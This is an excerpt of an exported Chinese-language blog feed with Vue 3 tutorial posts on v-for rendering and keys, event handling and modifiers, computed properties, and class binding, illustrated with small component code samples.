class="language-javascript">                <span class="string">&quot;id&quot;</span>:<span class="number">35180</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;title&quot;</span>:<span class="string">&quot;江城子·乙卯正月二十日夜记梦&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;img&quot;</span>:<span class="string">&quot;https://img.shicimingju.com/pics/item/35180.jpg&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;id&quot;</span>:<span class="number">3638</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;title&quot;</span>:<span class="string">&quot;声声慢·寻寻觅觅&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;img&quot;</span>:<span class="string">&quot;https://img.shicimingju.com/pics/item/3638.jpg&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">        ]</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>列表渲染<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-for</span>=<span class="string">&quot;item in names&quot;</span>&gt;</span>&#123;&#123; item &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">&quot;book in books&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; book.title &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:src</span>=<span class="string">&quot;book.img&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>位置索引</strong><br>v-for 也支持使用可选的第二个参数表示当前项的位置索引</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">names</span>:[<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>],</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>列表渲染<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-for</span>=<span class="string">&quot;(item,index) in names&quot;</span>&gt;</span>&#123;&#123; &quot;item&quot; &#125;&#125;-&#123;&#123; index &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>你也可以使用of作为分隔符代替in，这更接近JavaScript语法</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">v-for</span>=<span class="string">&quot;(item,index) of names&quot;</span>&gt;</span>&#123;&#123; &quot;items&quot; &#125;&#125;-&#123;&#123; index &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>v-for与对象</strong><br>你也可以使用v-for遍历一个对象的所有属性</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">user</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">age</span>:<span class="string">&#x27;26&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>列表渲染<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-for</span>=<span class="string">&quot;(value,key,index) of user&quot;</span>&gt;</span>&#123;&#123; value &#125;&#125;-&#123;&#123; key &#125;&#125;-&#123;&#123; index &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>通过key管理状态</strong><br>Vue默认按照“就地更新”的策略来更新通过v-for渲染的元素列表。当数据项的顺序改变时，Vue不会随之移动DOM元素的顺序，而是就地更新每个元素，确保它们在原本指定的索引位置上渲染。 为了给Vue一个提示，以便它可以跟踪每个节点的标识，从而重用和重新排序现有的元素，你需要为每个元素对应的块提供一个唯一的key attribute：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">names</span>:[<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>],            </span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">v-for</span>=<span class="string">&quot;(item,index) of names&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span>&#123;&#123; item &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>温馨提示 key在这里是一个通过v-bind绑定的特殊attribute 推荐在任何可行的时候为v-for提供一个key attribute key绑定的值期望是一个基础类型的值，例如字符串或number类型</li>
</ul>
<p>请不要使用index作为key的值，我们要确保每一条数据的唯一索引不会发生变化</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">names</span>:[<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>],</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">books</span>:[&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;id&quot;</span>:<span class="number">25739</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;title&quot;</span>:<span class="string">&quot;将进酒·君不见黄河之水天上来&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;img&quot;</span>:<span class="string">&quot;https://img.shicimingju.com/pics/item/25739.jpg&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;id&quot;</span>:<span class="number">35180</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;title&quot;</span>:<span class="string">&quot;江城子·乙卯正月二十日夜记梦&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;img&quot;</span>:<span class="string">&quot;https://img.shicimingju.com/pics/item/35180.jpg&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;id&quot;</span>:<span class="number">3638</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;title&quot;</span>:<span class="string">&quot;声声慢·寻寻觅觅&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;img&quot;</span>:<span class="string">&quot;https://img.shicimingju.com/pics/item/3638.jpg&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">        ],</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">v-for</span>=<span class="string">&quot;(item,index) of names&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span>&#123;&#123; item &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">&quot;(book,index) in books&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;book.id&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; book.title &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结八【Vue事件处理-事件修饰符】</title>
    <url>/cnblogs.github.io/p/11d0.html</url>
    <content><![CDATA[<p><strong>事件修饰符</strong><br>在处理事件时调用 event.preventDefault() 或 event.stopPropagation() 是很常见的。尽管我们可以直接在方法内调用，但如果方法能更专注于数据逻辑而不用去处理 DOM 事件的细节会更好。为解决这一问题，Vue 为 v-on 提供了事件修饰符。修饰符是用 . 表示的指令后缀，包含以下这些：</p>
<ul>
<li>.stop</li>
<li>.prevent</li>
<li>.self</li>
<li>.capture</li>
<li>.once</li>
<li>.passive</li>
</ul>
<h3 id="阻止默认事件"><a href="#阻止默认事件" class="headerlink" title="阻止默认事件"></a>阻止默认事件</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">clickHandle</span>(<span class="params">e</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 阻止默认事件,之前我们都是要这么写</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//e.preventDefault()</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;点击了&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>事件修饰符<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 阻止默认事件,Vue可以这样写 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> @<span class="attr">click.prevent</span>=<span class="string">&quot;clickHandle&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span>&gt;</span>百度一下<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="阻止事件冒泡"><a href="#阻止事件冒泡" class="headerlink" title="阻止事件冒泡"></a>阻止事件冒泡</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">clickHandle</span>(<span class="params">e</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 阻止默认事件,之前我们都是要这么写</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//e.preventDefault()</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;点击了&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">clickDiv</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;点击了div&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">clickP</span>(<span class="params">e</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 阻止事件冒泡</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// e.stopPropagation()</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;点击了p&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>事件修饰符<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 阻止默认事件,Vue可以这样写 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> @<span class="attr">click.prevent</span>=<span class="string">&quot;clickHandle&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span>&gt;</span>百度一下<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> @<span class="attr">click</span>=<span class="string">&quot;clickDiv&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 阻止事件冒泡 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> @<span class="attr">click.stop</span>=<span class="string">&quot;clickP&quot;</span>&gt;</span>测试冒泡<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结六【Vue事件处理-事件处理】</title>
    <url>/cnblogs.github.io/p/663a.html</url>
    <content><![CDATA[<p><strong>事件处理</strong><br>我们可以使用v-on指令（简写为@)来监听DOM事件，并在事件触发时执行对应的JavaScript。用法：on:click&#x3D;”methodName”或@click&#x3D;”handler”</p>
<ul>
<li>内联事件处理器：事件被触发时执行的内联JavaScript语句（与onclick类似)</li>
<li>方法事件处理器：一个指向组件上定义的方法的属性名或是路径</li>
</ul>
<h3 id="内联事件处理器（少用）"><a href="#内联事件处理器（少用）" class="headerlink" title="内联事件处理器（少用）"></a>内联事件处理器（少用）</h3><p>内联事件处理器通常用于简单场景</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">count</span>: <span class="number">0</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>内联事件处理<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">on:</span>@<span class="attr">click</span>=<span class="string">&quot;count++&quot;</span>&gt;</span>Add<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; count &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="方法事件处理器（常用）"><a href="#方法事件处理器（常用）" class="headerlink" title="方法事件处理器（常用）"></a>方法事件处理器（常用）</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">count</span>: <span class="number">0</span></span></span><br><span class="line"><span class="language-javascript">        &#125;       </span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 所有的方法或者事件，都放在这里</span></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">addCount</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 读取到data里的数据方案：this.count</span></span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.<span class="property">count</span>++</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>内联事件处理<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addCount&quot;</span>&gt;</span>Add<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; count &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结十【Vue计算属性】</title>
    <url>/cnblogs.github.io/p/c920.html</url>
    <content><![CDATA[<p><strong>计算属性</strong><br>模板中的表达式虽然方便，但也只能用来做简单的操作。如果在模板中写太多逻辑，会让模板变得臃肿，难以维护，因此我们推荐使用计算属性依赖响应式状态的复杂逻辑。假设，我们判断，一个数组里是否有数据，之前我们是这么写：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">           <span class="attr">itzhangsan</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">               <span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">               <span class="attr">content</span>:[<span class="string">&#x27;前端&#x27;</span>,<span class="string">&#x27;Python&#x27;</span>,<span class="string">&#x27;Java&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">           &#125; </span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123; itzhangsan.name &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!-- 输出数组长度,若数组长度大于0则输出yes,否则输出no --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; itzhangsan.content.length &gt;0 ? &#x27;yes&#x27;:&#x27;no&#x27;&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果上面逻辑太多的话，会让模板变得臃肿。所以我们用计算属性。当然，我们用函数也可以实现：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">methods</span>:&#123;</span><br><span class="line">        <span class="title function_">itzhangsanContents</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="comment">//当itzhangsan.content数组长度大于0时,返回yes,否则返回no</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">itzhangsan</span>.<span class="property">content</span>.<span class="property">length</span> &gt;<span class="number">0</span> ? <span class="string">&#x27;yes&#x27;</span>:<span class="string">&#x27;no&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>计算属性缓存 VS 方法<br>你可能注意到我们在表达式中像这样调用一个函数也会获得和计算属性相同的结果</p>
<p><strong>重点区别：</strong><br>计算属性：计算属性值会基于其响应式依赖被缓存。一个计算属性仅会在其响应式依赖更新时才重新计算<br>方法：方法调用总是会在重渲染发生时再次执行函数</p>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结十一【Vue的Class绑定】</title>
    <url>/cnblogs.github.io/p/f8ea.html</url>
    <content><![CDATA[<p><strong>Class绑定</strong><br>数据绑定的一个常见需求场景是操纵元素的 CSS class 列表，因为 class 是 attribute，我们可以和其他attribute 一样使用 v-bind 将它们和动态的字符串绑定。但是，在处理比较复杂的绑定时，通过拼接生成字符串是麻烦且易出错的。因此，Vue 专门为 cass 的 v-bind 用法提供了特殊的功能增强。除了字符串外，表达的值也可以是对象或数组</p>
<h3 id="绑定对象"><a href="#绑定对象" class="headerlink" title="绑定对象"></a>绑定对象</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">isActive</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">hasError</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">           &#125; </span></span><br><span class="line"><span class="language-javascript">        &#125;    </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">:class</span>=<span class="string">&quot;&#123;&#x27;active&#x27;:isActive,&#x27;text-danger&#x27;:hasError&#125;&quot;</span>&gt;</span>Class样式绑定<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.active</span>&#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-size</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.text-danger</span>&#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>:red;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="多个对象绑定"><a href="#多个对象绑定" class="headerlink" title="多个对象绑定"></a>多个对象绑定</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">isActive</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">hasError</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">          <span class="comment">// 多个对象绑定</span></span></span><br><span class="line"><span class="language-javascript">          <span class="attr">classObjece</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">             <span class="attr">active</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">             <span class="string">&#x27;text-danger&#x27;</span>:<span 